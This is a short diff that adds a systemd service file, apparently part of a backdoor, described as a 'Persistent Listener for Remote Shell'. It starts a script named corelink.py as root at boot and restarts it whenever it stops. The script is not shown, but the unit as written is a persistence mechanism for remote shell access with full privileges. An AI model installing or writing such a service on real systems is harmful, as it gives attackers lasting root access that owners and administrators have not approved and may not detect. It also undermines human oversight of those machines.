@@ -1,0 +1,11 @@
+[Unit]
+Description=Core Agent - Persistent Listener for Remote Shell
+After=network.target
+
+[Service]
+ExecStart=/usr/local/bin/corelink.py
+Restart=always
+User=root
+
+[Install]
+WantedBy=multi-user.target
